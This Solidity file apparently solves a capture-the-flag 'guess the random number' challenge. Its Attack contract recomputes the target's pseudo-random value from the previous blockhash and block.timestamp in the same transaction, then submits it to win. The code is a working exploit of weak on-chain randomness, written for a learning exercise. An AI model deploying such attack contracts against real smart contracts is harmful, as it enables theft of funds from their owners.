/*
    Same scenario like last one, but this time we can't really guess the random in advance, it's like the random number is always formed whenever the `guess` function be called.

    But there's a trick, when we know that the block.number and block.timestamp be called in a transaction when we call that `solve` function from our Attack contract..At that time we can create the number and it be of same block.number and block.timestamp cuz these both function calls are exhibited in the same transaction which be the part of same block..Thus this solves our problem.

    Rest you know!
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IGuessTheRandomNumber{
    function guess(uint8) external;
}

contract Attack{
    IGuessTheRandomNumber public target;

    constructor(address victim){
        target = IGuessTheRandomNumber(victim);
    }

    function solve() external{
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        target.guess(answer);
    }
}